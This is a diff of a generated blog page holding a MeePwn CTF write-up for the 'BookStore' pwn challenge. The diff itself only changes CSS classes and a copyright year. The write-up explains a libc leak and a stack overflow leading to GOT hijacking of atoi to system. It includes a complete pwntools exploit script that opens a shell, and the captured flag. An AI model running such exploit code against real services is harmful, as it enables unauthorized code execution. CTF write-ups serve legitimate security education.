@@ -305,7 +305,7 @@
 
 <!-- more -->
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-------- BookStore --------
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-------- BookStore --------
 1.       Add Book.
 2.       Edit Book.
 3.       Delete Book.
@@ -313,7 +313,7 @@
 5.       Exit.
 </code></pre></div></div>
 
-<p>As we can see we can add, edit, delete or show a book. Books are stored in a pointer array <code class="highlighter-rouge">books</code>, each pointer point to a <code class="highlighter-rouge">book</code> data structure:</p>
+<p>As we can see we can add, edit, delete or show a book. Books are stored in a pointer array <code class="language-plaintext highlighter-rouge">books</code>, each pointer point to a <code class="language-plaintext highlighter-rouge">book</code> data structure:</p>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">book</span><span class="p">{</span>
     <span class="kt">char</span> <span class="n">book_name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
@@ -323,10 +323,10 @@
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>The <code class="highlighter-rouge">books</code> array and each <code class="highlighter-rouge">book</code> pointer are all placed on the stack memory.</p>
+<p>The <code class="language-plaintext highlighter-rouge">books</code> array and each <code class="language-plaintext highlighter-rouge">book</code> pointer are all placed on the stack memory.</p>
 
-<p>The program did not initialize the <code class="highlighter-rouge">book</code> variable before setting its data. Since there’s a libc address ( <code class="highlighter-rouge">&lt;atoi + 0x10&gt;</code> ) in it, we can leak the libc address by entering 4 characters in the description:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Choice:4
+<p>The program did not initialize the <code class="language-plaintext highlighter-rouge">book</code> variable before setting its data. Since there’s a libc address ( <code class="language-plaintext highlighter-rouge">&lt;atoi + 0x10&gt;</code> ) in it, we can leak the libc address by entering 4 characters in the description:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Choice:4
 ------------ 1 ------------
 Name: 11111111
 Author: 11111111
@@ -339,20 +339,20 @@ Description: AAAA�N���
 5.       Exit.
 </code></pre></div></div>
 
-<p>After done some fuzzing, I also found that if we input 32 characters in <code class="highlighter-rouge">book_name</code> and <code class="highlighter-rouge">author</code> ( no newline ) , the <code class="highlighter-rouge">desc_len</code> will be overwritten with our input, and become a large integer. Since when we edit the book description, the length to read is depend on the <code class="highlighter-rouge">desc_len</code> data, this make us able to overflow the <code class="highlighter-rouge">book-&gt;description</code> buffer and overwrite the pointers in the <code class="highlighter-rouge">books</code> array !</p>
+<p>After done some fuzzing, I also found that if we input 32 characters in <code class="language-plaintext highlighter-rouge">book_name</code> and <code class="language-plaintext highlighter-rouge">author</code> ( no newline ) , the <code class="language-plaintext highlighter-rouge">desc_len</code> will be overwritten with our input, and become a large integer. Since when we edit the book description, the length to read is depend on the <code class="language-plaintext highlighter-rouge">desc_len</code> data, this make us able to overflow the <code class="language-plaintext highlighter-rouge">book-&gt;description</code> buffer and overwrite the pointers in the <code class="language-plaintext highlighter-rouge">books</code> array !</p>
 
 <p>So here’s how I exploit the service:</p>
 <ol>
   <li>First leak the libc address</li>
-  <li>Overwrite the <code class="highlighter-rouge">desc_len</code> data</li>
-  <li>Overflow the <code class="highlighter-rouge">books[0]-&gt;desc</code> buffer and overwrite <code class="highlighter-rouge">books[0]</code>, let it point to the GOT section</li>
-  <li>Edit <code class="highlighter-rouge">books[0]</code> and do the GOT hijacking ( hijack atoi to system )</li>
+  <li>Overwrite the <code class="language-plaintext highlighter-rouge">desc_len</code> data</li>
+  <li>Overflow the <code class="language-plaintext highlighter-rouge">books[0]-&gt;desc</code> buffer and overwrite <code class="language-plaintext highlighter-rouge">books[0]</code>, let it point to the GOT section</li>
+  <li>Edit <code class="language-plaintext highlighter-rouge">books[0]</code> and do the GOT hijacking ( hijack atoi to system )</li>
 </ol>
 
-<p>The exploit at the local side worked, but for some unknown reason, the service at the remote side has a different behavior: during the last step of the exploitation, it won’t let us input the <code class="highlighter-rouge">author</code> data, thus failing our exploit. Although we can still pwn it by not entering the author’s name, it still took me a while to debug the whole process.</p>
+<p>The exploit at the local side worked, but for some unknown reason, the service at the remote side has a different behavior: during the last step of the exploitation, it won’t let us input the <code class="language-plaintext highlighter-rouge">author</code> data, thus failing our exploit. Although we can still pwn it by not entering the author’s name, it still took me a while to debug the whole process.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 <span class="kn">import</span> <span class="nn">sys</span>
@@ -364,11 +364,11 @@ Description: AAAA�N���
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"./libc6_2.23-0ubuntu7_amd64.so"</span>
 
 <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF_PATH</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
-<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c"># for gdb.attach</span>
-
-<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="c"># context.binary is an ELF object</span>
-<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
+</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c1"># for gdb.attach
+</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="c1"># context.binary is an ELF object
+</span><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">add_book</span><span class="p">(</span><span class="n">book</span><span class="p">,</span> <span class="n">author</span><span class="p">,</span> <span class="n">dlen</span><span class="p">,</span> <span class="n">desc</span><span class="p">):</span>
     <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Choice:"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
@@ -400,39 +400,39 @@ Description: AAAA�N���
     <span class="n">add_book</span><span class="p">(</span><span class="n">book</span><span class="p">,</span> <span class="n">author</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="s">"AAAA</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
     <span class="n">show_book</span><span class="p">()</span>
     
-    <span class="c"># leak libc</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"AAAA"</span><span class="p">)</span>
+    <span class="c1"># leak libc
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"AAAA"</span><span class="p">)</span>
     <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'atoi'</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x10</span>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
 
     <span class="n">del_book</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
     <span class="n">book</span><span class="p">,</span> <span class="n">author</span> <span class="o">=</span> <span class="s">"1"</span><span class="o">*</span><span class="mi">32</span><span class="p">,</span> <span class="s">"a"</span><span class="o">*</span><span class="mi">32</span>  
-    <span class="c"># make book[0]-&gt;size = very big</span>
-    <span class="c"># later when we edit book[0]-&gt;desc, it will overwrite the pointer of book[0]</span>
-    <span class="n">add_book</span><span class="p">(</span><span class="n">book</span><span class="p">,</span> <span class="n">author</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="s">"AAAA</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="c1"># make book[0]-&gt;size = very big
+</span>    <span class="c1"># later when we edit book[0]-&gt;desc, it will overwrite the pointer of book[0]
+</span>    <span class="n">add_book</span><span class="p">(</span><span class="n">book</span><span class="p">,</span> <span class="n">author</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="s">"AAAA</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    
-    <span class="c"># edit book[1]-&gt;desc, overwrite book[0]</span>
-    <span class="c"># change book[0]-&gt;name to got section</span>
-    <span class="c"># later we can edit book[0] &amp; do GOT hijacking</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="s">"i"</span><span class="o">*</span><span class="mi">503</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602028</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+    <span class="c1"># edit book[1]-&gt;desc, overwrite book[0]
+</span>    <span class="c1"># change book[0]-&gt;name to got section
+</span>    <span class="c1"># later we can edit book[0] &amp; do GOT hijacking
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">"i"</span><span class="o">*</span><span class="mi">503</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602028</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
     <span class="n">edit_book</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
-    <span class="c"># overwrite atoi to system</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="s">"i"</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">])</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+    <span class="c1"># overwrite atoi to system
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">"i"</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">])</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
     <span class="n">book</span><span class="p">,</span> <span class="n">author</span><span class="p">,</span> <span class="n">desc</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400706</span><span class="p">)[:</span><span class="mi">6</span><span class="p">:]</span> <span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006f6</span><span class="p">)[:</span><span class="mi">6</span><span class="p">:],</span> <span class="n">payload</span>
     <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Choice:"</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"?"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"name:"</span><span class="p">,</span> <span class="n">book</span><span class="p">)</span>
-    <span class="c"># don't know why author won't read input.....</span>
-    <span class="c">#r.sendafter("uthor:", author)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"tion:"</span><span class="p">,</span> <span class="n">desc</span><span class="p">)</span>
+    <span class="c1"># don't know why author won't read input.....
+</span>    <span class="c1">#r.sendafter("uthor:", author)
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"tion:"</span><span class="p">,</span> <span class="n">desc</span><span class="p">)</span>
  
     <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"sh"</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
 
-<p>flag: <code class="highlighter-rouge">MeePwnCTF{0ld_sch00ld_C4n4ry_1s_0n_th3_st4ck}</code></p>
+<p>flag: <code class="language-plaintext highlighter-rouge">MeePwnCTF{0ld_sch00ld_C4n4ry_1s_0n_th3_st4ck}</code></p>
 
         
       </section>
@@ -537,7 +537,6 @@ Description: AAAA�N���
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -557,7 +556,6 @@ Description: AAAA�N���
 
         
           
-          
 
 
 
@@ -576,7 +574,6 @@ Description: AAAA�N���
 </div>
 
         
-          
           
 
 
@@ -599,7 +596,6 @@ Description: AAAA�N���
 
         
           
-          
 
 
 
@@ -620,6 +616,7 @@ Description: AAAA�N���
         
       </div>
     </div>
+  
   
 </div>
 
@@ -670,7 +667,7 @@ Description: AAAA�N���
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
